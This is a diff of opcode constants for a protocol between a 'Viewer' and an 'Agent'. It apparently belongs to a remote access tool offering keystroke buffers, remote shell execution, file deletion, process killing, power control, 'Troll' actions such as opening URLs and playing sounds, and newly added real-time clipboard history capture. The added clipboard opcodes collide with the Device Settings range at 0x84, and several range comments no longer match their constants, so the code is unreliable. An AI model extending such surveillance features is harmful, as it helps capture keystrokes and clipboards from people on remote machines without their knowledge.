@@ -52,7 +52,7 @@ OP_KEY_BUFFER  = 0x62  # Payload: buffered keystrokes
 OP_SETTINGS    = 0x63  # Payload: JSON settings
 
 # ============================================================================
-# Shell (0x70-0x72)
+# Shell (0x70-0x73)
 # ============================================================================
 OP_SHELL_EXEC   = 0x70  # Viewer -> Agent: {"cmd": "...", "shell": "ps|cmd"}
 OP_SHELL_OUTPUT = 0x71  # Agent -> Viewer: stdout/stderr chunk
@@ -67,7 +67,7 @@ OP_PM_DATA      = 0x75  # Agent -> Viewer: JSON [{pid, name, cpu, mem}]
 OP_PM_KILL      = 0x76  # Viewer -> Agent: {pid: int}
 
 # ============================================================================
-# File Manager (0x78-0x7F)
+# File Manager (0x78-0x7E)
 # ============================================================================
 OP_FM_LIST      = 0x78  # Viewer -> Agent: {"path": "..."}
 OP_FM_DATA      = 0x79  # Agent -> Viewer: JSON [{name, is_dir, size, modified}]
@@ -78,11 +78,15 @@ OP_FM_DELETE    = 0x7D  # Viewer -> Agent: {"path": "..."}
 OP_FM_MKDIR     = 0x7E  # Viewer -> Agent: {"path": "..."}
 
 # ============================================================================
-# Clipboard (0x80-0x82)
+# Clipboard (0x80-0x87)
 # ============================================================================
 OP_CLIP_GET     = 0x80  # Viewer -> Agent: request clipboard
 OP_CLIP_DATA    = 0x81  # Agent -> Viewer: clipboard content
 OP_CLIP_SET     = 0x82  # Viewer -> Agent: set clipboard content
+OP_CLIP_HISTORY_REQ = 0x83  # Viewer -> Agent: request clipboard history
+OP_CLIP_HISTORY_DATA = 0x84  # Agent -> Viewer: JSON history list
+OP_CLIP_ENTRY   = 0x85  # Agent -> Viewer: new clipboard entry (real-time)
+OP_CLIP_DELETE  = 0x86  # Viewer -> Agent: delete entry by index
 
 # ============================================================================
 # Device Settings (0x84-0x8D)
@@ -99,7 +103,7 @@ OP_SYSINFO_DATA   = 0x8C  # JSON {os, cpu, ram, disk, battery, wifi_available}
 OP_POWER_ACTION   = 0x8D  # {"action": "sleep|restart|shutdown|lock|logoff"}
 
 # ============================================================================
-# Troll (0x90-0x9F)
+# Troll (0x90-0x9C)
 # ============================================================================
 OP_TROLL_URL          = 0x90  # {"url": "..."}
 OP_TROLL_SOUND        = 0x91  # audio bytes
